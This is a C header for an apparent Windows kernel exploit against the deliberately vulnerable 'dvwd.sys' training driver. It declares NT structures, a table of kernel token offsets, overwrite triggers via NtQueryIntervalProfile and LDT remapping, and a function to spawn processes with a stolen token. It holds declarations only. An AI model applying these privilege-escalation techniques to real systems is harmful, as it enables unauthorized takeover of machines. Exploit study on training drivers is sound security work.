#ifndef __KERNEL_EXPLOIT_H
#define __KERNEL_EXPLOIT_H

#include <windows.h>
#include <winioctl.h>
#include <Sddl.h>

#define ARCH_IX86   0x01
#define ARCH_X86_64 0x02

#define DVWD_DRIVER_NAME "dvwd.sys"



typedef enum _SYSTEM_INFORMATION_CLASS
{ 
  SystemModuleInformation = 11,
  SystemHandleInformation = 16

} SYSTEM_INFORMATION_CLASS;


typedef struct _SYSTEM_HANDLE_INFORMATION_ENTRY
{
  ULONG ProcessId;
  BYTE ObjectTypeNumber;
  BYTE Flags;
  SHORT Handle;
  PVOID Object;
  ULONG GrantedAccess;

} SYSTEM_HANDLE_INFORMATION_ENTRY, *PSYSTEM_HANDLE_INFORMATION_ENTRY;



typedef struct {
    ULONG   Count;
    SYSTEM_HANDLE_INFORMATION_ENTRY Handle[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;




typedef NTSTATUS (WINAPI *_NtQuerySystemInformation)(
   SYSTEM_INFORMATION_CLASS SystemInformationClass,
   PVOID SystemInformation,
   ULONG SystemInformationLength,
   PULONG ReturnLength
);


#define UNUSED_OFF 0
#define IGNORE_CHECK 0xFFFFFFFF

typedef struct _KERN_OFFSET_OPT
{
  UINT32 SidListOffset;
  UINT32 SidListCountOffset;
  UINT32 RSidListOffset;
  UINT32 RSidListCountOffset;  
  UINT32 PrivListOffset;
  UINT32 PrivListCountOffset;
  UINT32 ObjTableOffset;

} KERN_OFFSET_OPT, *PKERN_OFFSET_OPT;



typedef struct _KERN_OFFSET_ENTRY
{
  PWCHAR name;
  DWORD major;
  DWORD minor;
  DWORD majorSP;
  DWORD minorSP;
  DWORD arch;
  KERN_OFFSET_OPT Values;

} KERN_OFFSET_ENTRY, *PKERN_OFFSET_ENTRY;

extern PKERN_OFFSET_ENTRY TargetHost;

extern SYSTEM_INFO GlobalInfo;


extern BOOL CreateChild(PTCHAR Child);
extern VOID GetOSVersion(PDWORD major, PDWORD minor, PDWORD servicePackMajor, PDWORD servicePackMinor);
extern VOID FillMap(PVOID map, ULONG_PTR value, UINT size);
extern BOOL LoadAndGetKernelBase();
extern PVOID CreateUspaceMapping(UINT Blocks);
extern PVOID CreateUspaceExecMapping(UINT blocks);
extern PVOID CreateUspaceMappingWithAddr(UINT blocks, PVOID preferredAddress);
extern BOOL SpawnChildWithToken(HANDLE hToken, PWCHAR command);
extern BOOL CreateTokenFromCaller(PHANDLE hToken);

/* 32-bit */
BOOL TriggerOverwrite32_NtQueryIntervalProfileWay(VOID);
BOOL TriggerOverwrite32_LDTRemappingWay(VOID);
VOID TriggerOverflow32(VOID);
 

/* 64-bit */
BOOL TriggerOverflow64(VOID);

#endif // __KERNEL_EXPLOIT_H